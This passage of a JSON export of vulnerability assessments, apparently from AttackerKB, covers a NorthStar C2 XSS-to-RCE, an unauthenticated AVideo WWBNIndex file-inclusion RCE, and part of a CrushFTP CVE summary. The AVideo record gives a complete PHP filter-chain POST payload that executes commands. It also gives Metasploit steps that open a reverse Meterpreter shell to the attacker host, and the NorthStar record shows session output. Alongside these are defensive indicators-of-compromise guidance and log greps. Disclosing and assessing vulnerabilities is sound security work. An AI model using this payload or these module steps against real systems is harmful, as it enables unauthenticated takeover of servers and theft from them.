exploit(windows/http/northstar_c2_xss_to_agent_rce) \u003e [*] Waiting on XSS execution\r\n[+] 172.16.199.131   northstar_c2_xss_to_agent_rce - Received cookie: d89vrb0v20fpr9mr9v63t6ag4j\r\n[+] 172.16.199.131   northstar_c2_xss_to_agent_rce - Live Agents\r\n===========\r\n\r\n ID                   IP              OS                     Username                 Hostname         Status\r\n --                   --              --                     --------                 --------         ------\r\n NcXSkaPsdYYqgc3m1Wq  172.16.199.137  Windows 10 Enterprise  DESKTOP-N3ORU31\\msfuser  DESKTOP-N3ORU31  Online\r\n\r\n[*] 172.16.199.131   northstar_c2_xss_to_agent_rce - (NcXSkaPsdYYqgc3m1Wq) Stealing DESKTOP-N3ORU31\r\n[*] Sending stage (201798 bytes) to 172.16.199.137\r\n[*] Meterpreter session 1 opened (172.16.199.1:4444 -\u003e 172.16.199.137:50597) at 2024-05-13 14:25:50 -0700\r\n\r\nmsf6 exploit(windows/http/northstar_c2_xss_to_agent_rce) \u003e sessions -i 1\r\n[*] Starting interaction with 1...\r\n\r\nmeterpreter \u003e getuid\r\nServer username: DESKTOP-N3ORU31\\msfuser\r\nmeterpreter \u003e sysinfo\r\nComputer        : DESKTOP-N3ORU31\r\nOS              : Windows 10 (10.0 Build 19045).\r\nArchitecture    : x64\r\nSystem Language : en_US\r\nDomain          : WORKGROUP\r\nLogged On Users : 2\r\nMeterpreter     : x64/windows\r\nmeterpreter \u003e\r\n```\r\n\r\n# Attacker Value and Exploitability\r\n\r\nThis requires an admin user interaction in order for the exploit to be successful, which is why the attacker value is lower. Also you don't know what target you're going to get a session on before the exploit is successful because you're unable to see what agents are connected to the C2 up until you steal the admin cookie, which also makes this slightly less appealing. Although that being said it's pretty cool such a solid and reliable exploit was found in a C2 used by real APTs.\r\n\r\n# References\r\nhttps://blog.chebuya.com/posts/discovering-cve-2024-28741-remote-code-execution-on-northstar-c2-agents-via-pre-auth-stored-xss/#fn:2","score":2,"metadata":{"attacker-value":2,"exploitability":2},"tags":[{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"},{"id":"02c27d86-7690-4074-8f1e-dead30c1e2fa"},{"id":"01c67142-c23f-4ee7-8803-49d10d588299"}]},{"id":"982c48b6-69a7-4c4b-aa08-5c4ca5a482a3","editorId":"de2686f1-1a8a-4518-8379-12188d859523","topicId":"2fbd70fc-f5ba-4934-be8d-1829dce58a84","created":"2024-05-22T13:42:57.082183Z","revisionDate":"2024-05-22T13:42:57.079224Z","document":"[WWNB AVideo](https://github.com/WWBN/AVideo) is a versatile and advanced video streaming platform tailored for individual content creators, businesses, and developers alike. Versions v.12.4 through v.14.2 which have the WWNBIndex Plugin installed suffer from a Local File Inclusion vulnerability which can be used to obtain Remote Code Execution through the use of [PHP Filter Chaining](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it). For those unfamiliar with PHP Filter Chaining please reference the previous link or the AKB article for [CVE-2023-6553](https://attackerkb.com/assessments/2c58ed71-2d98-4aec-9b22-bb835fea1371) which goes into more detail of how the technique works.\r\n\r\nThe vulnerable line of code lives on line 6 of `/AVideo/plugin/WWBNIndex/submitIndex.php`:\r\n![image](https://github.com/rapid7/metasploit-framework/assets/23320005/5c27ec09-a4f1-48cb-80d9-491eb2186758)\r\n\r\nThe unfiltered POST request parameter `systemRootPath` gets directly used in a `require_once` statement which is normally just an LFI but by leveraging PHP Filter Chaining it can be turned into RCE. The vulnerable code can be accessed without authentication by hitting the following endpoint: `\u003ctarget_uri.path\u003e/plugin/WWBNIndex/submitIndex.php/`.  \r\n# PoC \r\n\r\nThe following POST request can be used to execute code on a vulnerable system. The POST request executes the following command: `ping 172.16.199.1` which is the IP address of my host machine.\r\n```\r\nPOST /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\r\nHost: 172.16.199.131\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11884\r\n\r\nsystemRootPath=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\r\n```\r\n\r\nWith tcpdump running in a separate terminal we can see ICMP requests start coming from `example.com` which is `172.16.199.131`\r\n```\r\n➜  metasploit-framework git:(upstream-master) ✗ sudo tcpdump -i any icmp\r\nPassword:\r\ntcpdump: data link type PKTAP\r\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\r\nlistening on any, link-type PKTAP (Apple DLT_PKTAP), snapshot length 524288 bytes\r\n08:49:08.893463 IP example.com \u003e 172.16.199.1: ICMP echo request, id 1, seq 164, length 64\r\n08:49:08.893468 IP example.com \u003e 172.16.199.1: ICMP echo request, id 1, seq 164, length 64\r\n08:49:08.893494 IP 172.16.199.1 \u003e example.com: ICMP echo reply, id 1, seq 164, length 64\r\n08:49:08.893496 IP 172.16.199.1 \u003e example.com: ICMP echo reply, id 1, seq 164, length 64\r\n08:49:09.917575 IP example.com \u003e 172.16.199.1: ICMP echo request, id 1, seq 165, length 64\r\n08:49:09.917579 IP example.com \u003e 172.16.199.1: ICMP echo request, id 1, seq 165, length 64\r\n```\r\n# Metasploit Module Demo\r\nThe Metasploit Module has three separate targets which can be exploited:\r\n```\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) \u003e show targets\r\n\r\nExploit targets:\r\n=================\r\n\r\n    Id  Name\r\n    --  ----\r\n    0   Automatic\r\n=\u003e  1   PHP In-Memory\r\n    2   Unix In-Memory\r\n    3   Windows In-Memory\r\n```\r\nWe we use the `PHP In-Memory` target for this demonstration which will allow us to get a PHP Meterpreter session on the target executing in the context of the user running the application which in this case will be `www-data`:\r\n```\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) \u003e set payload php/meterpreter/reverse_tcp\r\npayload =\u003e php/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) \u003e set target 1\r\ntarget =\u003e 1\r\nmsf6 exploit(multi/http/avideo_wwbnindex_unauth_rce) \u003e run\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable. Detected vulnerable AVideo version: 12.4, with vulnerable plugin WWBNIndex running.\r\n[*] Sending stage (39927 bytes) to 172.16.199.131\r\n[*] Meterpreter session 1 opened (172.16.199.1:4444 -\u003e 172.16.199.131:45702) at 2024-05-22 09:38:12 -0400\r\n\r\nmeterpreter \u003e getuid\r\nServer username: www-data\r\nmeterpreter \u003e sysinfo\r\nComputer    : msfuser-virtual-machine\r\nOS          : Linux msfuser-virtual-machine 6.2.0-35-generic #35~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct  6 10:23:26 UTC 2 x86_64\r\nMeterpreter : php/linux\r\nmeterpreter \u003e\r\n```\r\n\r\n# IoCs\r\nThe [Wiki](https://github.com/WWBN/AVideo/wiki/How-to-install-LAMP,-FFMPEG-and-Git-on-a-fresh-Ubuntu-22.x-for-AVideo-Platform-version-11.x-or-newer) instructs users to install using a LAMP environment which means IoCs are most likely going to be found in the `/var/log/apache2` directory. I would suggest running the following `grep` command:\r\n\r\n```\r\nmsfuser@msfuser-virtual-machine:/var/log$ grep -r \"plugin/WWBNIndex/submitIndex.php\" ./\r\ngrep: ./boot.log: Permission denied\r\ngrep: ./vmware-vmtoolsd-root.log: Permission denied\r\ngrep: ./vmware-vmsvc-root.2.log: Permission denied\r\ngrep: ./btmp: Permission denied\r\ngrep: ./private: Permission denied\r\ngrep: ./gdm3: Permission denied\r\n./apache2/access.log:172.16.199.1 - - [22/May/2024:05:46:22 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n./apache2/access.log:172.16.199.1 - - [22/May/2024:05:49:19 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n./apache2/error.log.1:[Tue May 21 11:19:15.787030 2024] [php:warn] [pid 13160] [client 172.16.199.1:58523] PHP Warning:  Undefined array key \"systemRootPath\" in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log.1:[Tue May 21 11:19:15.787365 2024] [php:warn] [pid 13160] [client 172.16.199.1:58523] PHP Warning:  require_once(plugin/WWBNIndex/WWBNIndex.php): Failed to open stream: No such file or directory in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log.1:[Tue May 21 11:19:15.787387 2024] [php:error] [pid 13160] [client 172.16.199.1:58523] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:46:22.086098 2024] [php:warn] [pid 14828] [client 172.16.199.1:49163] PHP Warning:  Undefined array key \"systemRootPath\" in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:46:22.086170 2024] [php:warn] [pid 14828] [client 172.16.199.1:49163] PHP Warning:  require_once(plugin/WWBNIndex/WWBNIndex.php): Failed to open stream: No such file or directory in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:46:22.086186 2024] [php:error] [pid 14828] [client 172.16.199.1:49163] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:49:19.874976 2024] [php:warn] [pid 14825] [client 172.16.199.1:49220] PHP Warning:  Undefined array key \"systemRootPath\" in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:49:19.875069 2024] [php:warn] [pid 14825] [client 172.16.199.1:49220] PHP Warning:  require_once(plugin/WWBNIndex/WWBNIndex.php): Failed to open stream: No such file or directory in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/error.log:[Wed May 22 05:49:19.875100 2024] [php:error] [pid 14825] [client 172.16.199.1:49220] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6\r\n./apache2/access.log.1:172.16.199.1 - - [21/May/2024:11:19:15 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n./apache2/access.log.1:172.16.199.1 - - [21/May/2024:11:19:15 -0700] \"POST /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 0 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"\r\n```\r\n\r\nPay close attention to the apache `error.log`. This line indicates an attacker could have attempted to exploit the vulnerability but attempted to run a command that failed and thus the vulnerable require statement on line 6 of `submitIndex.php` that facilitates the RCE also failed: \r\n`./apache2/error.log.1:[Tue May 21 11:19:15.787387 2024] [php:error] [pid 13160] [client 172.16.199.1:58523] PHP Fatal error:  Uncaught Error: Failed opening required 'plugin/WWBNIndex/WWBNIndex.php' (include_path='.:/usr/share/php') in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php:6\\nStack trace:\\n#0 {main}\\n  thrown in /var/www/html/AVideo/plugin/WWBNIndex/submitIndex.php on line 6`\r\n\r\nAlso pay close attention to the apache `access.log`. This line indicates an attacker could have attempted to access the vulnerability:\r\n`./apache2/access.log:172.16.199.1 - - [22/May/2024:05:49:19 -0700] \"GET /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\" 200 963 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\"`\r\n\r\nNote that the presence of both of the log lines highlighted above do not necessarily indicate the system has been compromised, they could be from normal operation. However on a compromised system, if an attacker did not clean up after themselves (delete those log files) it's very likely traces like the ones mentioned above would be present. \r\n\r\n# Obtaining a Vulnerable version\r\n\r\nThe WWBNIndex Plugin is installed by default on the most recent patched versions. There is only one affected release (12.4) available for [download](https://github.com/WWBN/AVideo/releases/tag/12.4)on the official GitHub page and the vulnerable plugin does not exist in this release. The original exploit author doesn't mention having to install the vulnerable plugin in order for the application to be vulnerable, they mention:\r\n\r\n\u003e This particular vulnerability lies within the WWBNIndex plugin — a crucial component for the platform’s functionality\r\n\r\nIt seems as though all vulnerable versions have been removed from the GitHub release section. If you want to install a vulnerable version, please checkout the following [branch](https://github.com/WWBN/AVideo/pull/8369) on the AVideo GitHub page and install the application from there.\r\n\r\n# Attacker Value and Exploitability \r\nI gave this vulnerability the Attacker Value and Exploitability values I did because of the unauthenticated unprivileged access it gives to an attacker. Also because of how easy the vulnerability is to exploit and for how reliable the exploit is.  \r\n\r\n\r\n","score":1,"metadata":{"attacker-value":4,"exploitability":4},"tags":[{"id":"067ecf0c-8227-4437-bc04-a92d84b545bb"},{"id":"240789d2-3e0b-4967-a6a4-8f09029f642d"}]},{"id":"372ce344-cefb-4da1-8ba7-faf072bf4841","editorId":"23b070fe-f794-4907-b885-8b1f272c3f68","topicId":"e9ab9d6b-7a7f-49e4-91b5-b8c07a1e430f","created":"2024-05-20T20:32:07.091957Z","revisionDate":"2024-05-20T20:32:07.089823Z","document":"CVE-2023-43177: Critical Unauthenticated Remote Code Execution in CrushFTP\r\n\r\nOverview:\r\n\r\nCVE-2023-43177 is a critical vulnerability disclosed in August 2023, affecting CrushFTP servers prior to version 10.5.1. This vulnerability enables unauthenticated attackers to achieve remote code execution (RCE) on affected systems, leading to complete compromise.\r\n\r\nTechnical Details:\r\n\r\nThe vulnerability stems from an unauthenticated mass assignment flaw in how CrushFTP parses AS2 protocol headers. An attacker can manipulate these headers to gain arbitrary file read-and-delete access on the server's file system. By chaining this with other techniques, they can escalate privileges and execute arbitrary code with the permissions of the CrushFTP server process, typically resulting in root access.\r\n\r\nSeverity and Risk:\r\n\r\nThis vulnerability has been assigned a CVSS v3.1 base score of 9.8, classifying it as Critical. This high severity is due to:\r\n\r\nNo Authentication Required: Exploitation does not require any valid user credentials.\r\nRemote Exploitation: The attack can be launched remotely over the network.\r\nFull System Compromise: Successful exploitation leads to complete control of the affected server.\r\nAttacker Value and Exploitability Assessment:\r\n\r\nBased on a personal assessment, this vulnerability is rated as having high attacker value due to the potential for complete system compromise and the wide range of sensitive data that may be stored on file transfer servers. Additionally, the availability of public exploits and the straightforward exploitation process contribute to its easy exploitability.\r\n\r\nVerified Active Exploitation:\r\n\r\nWhile concrete public disclosures of widespread attacks are limited, several indicators point to active exploitation attempts:\r\n\r\nProof-of-Concept Exploits: Public PoC exploits exist, lowering the barrier to entry for 